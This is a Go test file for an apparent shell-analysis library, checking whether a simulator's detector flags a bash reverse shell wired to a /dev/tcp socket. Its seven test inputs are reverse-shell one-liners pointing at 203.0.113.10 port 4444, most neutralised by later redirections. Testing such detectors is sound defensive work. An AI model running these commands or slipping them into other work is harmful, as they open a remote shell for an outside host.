package analysis_test

import (
	"context"
	"errors"
	"testing"

	"github.com/nullptrpanic/libcommand"
	"github.com/nullptrpanic/libcommand/analysis"
)

func TestShellInheritedDescriptorsWithoutTrace(t *testing.T) {
	for _, test := range []*struct {
		name, source string
		risk         bool
	}{
		{"persistent duplex", `exec 3<>/dev/tcp/203.0.113.10/4444; bash -i <&3 >&3`, true},
		{"reopened fd", `exec 3<>/dev/tcp/203.0.113.10/4444; exec 3</dev/null; bash -i <&3 >&3`, false},
		{"closed fd", `exec 3<>/dev/tcp/203.0.113.10/4444; exec 3<&-; bash -i <&3 >&3`, false},
		{"here string overrides", `exec <>/dev/tcp/203.0.113.10/4444; bash -i <<< ''`, false},
		{"pipe overrides persistent input", `exec <>/dev/tcp/203.0.113.10/4444; printf '' | bash -i`, false},
		{"pipe overrides scoped input", `{ printf '' | bash -i; } </dev/tcp/203.0.113.10/4444`, false},
		{"scope override becomes persistent", `{ exec </dev/null; bash -i; } </dev/tcp/203.0.113.10/4444`, false},
	} {
		t.Run(test.name, func(t *testing.T) {
			simulator := libcommand.NewBuilder().Middleware(func(next libcommand.Command) libcommand.Command {
				return func(ctx context.Context, shell *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
					if invocation.Name == "bash" {
						if _, err := analysis.Shell(ctx, shell, invocation); err != nil {
							return nil, err
						}
					}
					return next(ctx, shell, invocation)
				}
			}).Build()
			err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: test.source})
			var detection *analysis.DetectionError
			risk := errors.As(err, &detection)
			if risk != test.risk || err != nil && !risk {
				t.Fatalf("error=%v, want risk=%t", err, test.risk)
			}
		})
	}
}
